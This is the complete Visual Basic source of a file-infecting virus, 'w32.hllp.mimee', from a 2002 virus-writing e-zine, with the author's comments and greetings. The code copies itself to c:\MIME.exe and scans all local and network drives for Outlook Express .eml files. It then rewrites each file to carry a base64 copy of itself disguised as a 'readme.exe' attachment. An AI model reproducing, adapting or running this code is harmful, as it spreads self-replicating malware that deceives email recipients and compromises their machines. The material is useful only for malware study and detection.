   '============================================================================================================================
   ' "w32.hllp.mimee by alcopaul/[rRlf]"
   '============================================================================================================================
   ' This virus searches for outlook express 6 - 5.5 .eml files in hd, embeds itself to them as attachment...
   '
   ' the routine was also implemented in my new worm, w32.hllp.alco, which can also be obtained in my webpage..
   '
   ' its executable was successfully compiled in vb6 and tested in winme.. it infected .eml files saved in .html format, whether
   ' they contained attachments or not.. it also infected .eml files saved in plain text with attachments... it did fail
   ' in infecting .eml files saved in plain text without attachments..
   '
   ' comments added : march 18, 2002 for PetiK e-zine...
   '
   '
   'the source..
   '
   '============================================================================================================================
   Option Explicit
   Sub Main() '::: go modules
   On Error Resume Next
   Dim a, b, c
   a = App.Path & "\" & App.EXEName & ".exe"
   b = App.Path & App.EXEName & ".exe"
   c = "c:\MIME.exe"
   FileCopy a, c ':::spawn c:\MIME.exe for b64 process
   FileCopy b, c
   Call dribe
   End Sub
   Private Sub mimeinfect(fileinput As String) ':::the routine
   On Error Resume Next
   Dim dd As Integer
   Dim s As String
   Dim sig, ver, textline, ddd, bb, extasy, extasy1, sex, g, gh, rout, num, source, fileread, b, c, d, e
   Open fileinput For Input As #6
   Do Until Mid(sig, 1, 4) = "MIME" ':::search for "MIME-Version: 1.0" in the .eml file
   Line Input #6, sig
   Loop
   Line Input #6, ver ':::read for the signature
   Close #6
   If Mid(ver, 18, 3) = "666" Then ':::if signature is present,
   ':::no process
   Else ':::if not, read the necessary data
   Open fileinput For Input As #1 ':::reopen files coz i don't know how to maintain the variables...
   Do Until Mid(textline, 1, 4) = "MIME" ':::read lines up to "MIME-Version: 1.0"
   Line Input #1, textline
   ddd = ddd & textline & vbCrLf ':::store read lines to a variable
   Loop
   If Mid(textline, 1, 4) = "MIME" Then ':::reread "MIME-Version: 1.0"
   bb = ddd & textline & "666" ':::add the signature...
   End If
   Line Input #1, extasy ':::read content-type
   Line Input #1, extasy1 ':::read boundary
   If Mid(extasy1, 2, 5) = "bound" Then ':::if boundary... = boundary...
   ':::no process
   Else
   Line Input #1, sex ':::if boundary... = boundary...
   extasy1 = sex ':::store to new variable and equate it to the old variable
   End If
   Do Until EOF(1)
   Line Input #1, g '::: read strings after boundary...
   gh = gh & g & vbCrLf
   dd = dd + 1 '::: important.. to be able for us to remove the strings(------=_NextPart_..#)  at the end of the .eml file, we must count lines..
   Loop
   Close #1 ':::close
   Open fileinput For Input As #7 ':::reopen for final read
   Do Until Mid(rout, 1, 4) = "MIME" ':::position to "MIME-Version: 1.0"
   Line Input #7, rout ':::store to dummy variable
   Loop
   For num = 0 To dd - 1 '::: read after "MIME-Version: 1.0" but well remove the last strings(------=_NextPart_..#)
   Line Input #7, source
   fileread = fileread & source & vbCrLf ':::store them to variable
   Next num
   Close #7
   b = Mid(extasy1, 12, 41) ':::read ----=_NextPart_..#
   c = "c:\MIME.exe"
   d = EncodeBase64(c) ':::b64 our file
   e = "Content-Type: application/x-msdownload;" & vbCrLf & _ ':::mime add-ons
   "   name=""readme.exe""" & vbCrLf & _
   "Content-Transfer-Encoding: base64" & vbCrLf & _
   "Content-Disposition: attachment;" & vbCrLf & _
   "   filename=""readme.exe"""
   Open fileinput For Output As #1
   Print #1, bb '::: write data up to "MIME-Version: 1.0" + signature
   Print #1, fileread '::: write data after "MIME-Version: 1.0" minus the ------=_NextPart_..#
   Print #1, "--" & b '::: write the unique ------=_NextPart_..#
   Print #1, e ':::write the mimeheader addons
   Print #1, d '::: write the b64ed copy of itself
   Print #1, "--" & b & "--" '::: write the unique ------=_NextPart_..# at the end of the fuckin' .eml file
   Close #1 ':::finally, close the file
   End If
   End Sub
   Private Function EncodeBase64(ByVal vsFullPathname As String) As String ':::my indebtedness to a vb programmer
   On Error Resume Next
       'For Encoding BASE64
       Dim b           As Integer
       Dim Base64Tab   As Variant
       Dim bin(3)      As Byte
       Dim s           As String
       Dim l           As Long
       Dim i           As Long
       Dim FileIn      As Long
       Dim sResult     As String
       Dim n           As Long

       'Base64Tab=>tabla de tabulación
       Base64Tab = Array("A", "B", "C", "D", "E", "F", "G", "H", "I", "J", "K", "L", "M", "N", "O", "P", "Q", "R", "S", "T", "U", "V", "W", "X", "Y", "Z", "a", "b", "c", "d", "e", "f", "g", "h", "i", "j", "k", "l", "m", "n", "o", "p", "q", "r", "s", "t", "u", "v", "w", "x", "y", "z", "0", "1", "2", "3", "4", "5", "6", "7", "8", "9", "+", "/")

       Erase bin
       l = 0: i = 0: FileIn = 0: b = 0:
       s = ""

       'Gets the next free filenumber
       FileIn = FreeFile

       'Open Base64 Input File
       Open vsFullPathname For Binary As FileIn

       sResult = s & vbCrLf
       s = ""

       l = LOF(FileIn) - (LOF(FileIn) Mod 3)

       For i = 1 To l Step 3

           'Read three bytes
           Get FileIn, , bin(0)
           Get FileIn, , bin(1)
           Get FileIn, , bin(2)

           'Always wait until there're more then 64 characters
           If Len(s) > 64 Then

               s = s & vbCrLf
               sResult = sResult & s
               s = ""

           End If

           'Calc Base64-encoded char
           b = (bin(n) \ 4) And &H3F 'right shift 2 bits (&H3F=111111b)
           s = s & Base64Tab(b) 'the character s holds the encoded chars

           b = ((bin(n) And &H3) * 16) Or ((bin(1) \ 16) And &HF)
           s = s & Base64Tab(b)

           b = ((bin(n + 1) And &HF) * 4) Or ((bin(2) \ 64) And &H3)
           s = s & Base64Tab(b)

           b = bin(n + 2) And &H3F
           s = s & Base64Tab(b)

       Next i

       'Now, you need to check if there is something left
       If Not (LOF(FileIn) Mod 3 = 0) Then

           'Reads the number of bytes left
           For i = 1 To (LOF(FileIn) Mod 3)
               Get FileIn, , bin(i - 1)
           Next i

           'If there are only 2 chars left
           If (LOF(FileIn) Mod 3) = 2 Then
               b = (bin(0) \ 4) And &H3F 'right shift 2 bits (&H3F=111111b)
               s = s & Base64Tab(b)

               b = ((bin(0) And &H3) * 16) Or ((bin(1) \ 16) And &HF)
               s = s & Base64Tab(b)

               b = ((bin(1) And &HF) * 4) Or ((bin(2) \ 64) And &H3)
               s = s & Base64Tab(b)

               s = s & "="

           Else 'If there is only one char left
               b = (bin(0) \ 4) And &H3F 'right shift 2 bits (&H3F=111111b)
               s = s & Base64Tab(b)

               b = ((bin(0) And &H3) * 16) Or ((bin(1) \ 16) And &HF)
               s = s & Base64Tab(b)

               s = s & "=="
           End If
       End If

       'Send the characters left
       If s <> "" Then
           s = s & vbCrLf
           sResult = sResult & s
       End If

       'Send the last part of the MIME Body
       s = ""

       Close FileIn
       EncodeBase64 = sResult

   End Function
   '::: search and infect
   Sub dribe()
     On Error Resume Next
     Dim d, dc, s, fso, dribe
     Set fso = CreateObject("Scripting.FileSystemObject")
     Set dc = fso.Drives
     For Each d In dc
       If d.DriveType = 2 Or d.DriveType = 3 Then
         fldr (d.Path & "\")
       End If
     Next
     dribe = s
   End Sub
   Sub info(spec)
     On Error Resume Next
     Dim f, f1, fc, ext, s, fso
     Set fso = CreateObject("Scripting.FileSystemObject")
     Set f = fso.GetFolder(spec)
     Set fc = f.Files
     For Each f1 In fc
       ext = fso.GetExtensionName(f1.Path)
       ext = LCase(ext)
       s = LCase(f1.Name)
       If (ext = "eml") Then
       mimeinfect (f1.Path)
   End If
   Next
   End Sub
   Sub fldr(spec)
     On Error Resume Next
     Dim f, f1, sf, fso
       Set fso = CreateObject("Scripting.FileSystemObject")
     Set f = fso.GetFolder(spec)
     Set sf = f.SubFolders
     For Each f1 In sf
       info (f1.Path)
       fldr (f1.Path)
     Next
   End Sub
   '============================================================================================================================
   '
   '
   ' greetz go to all the members of the ready rangers liberation front, energy, slage, PetiK, Zoom23, the PVW, virusbuster,
   ' my sister syra, my girlfriend janis, my mom and my dad..
   '
   ' coded while listening to the great music of bob marley, rancid, goldfinger, sex pistols, the clash, jimi hendrix
   ' and while eating my fave food, pork and beans with cabbage and rice and drinking a few litres of water...
   '
   '
   '============================================================================================================================
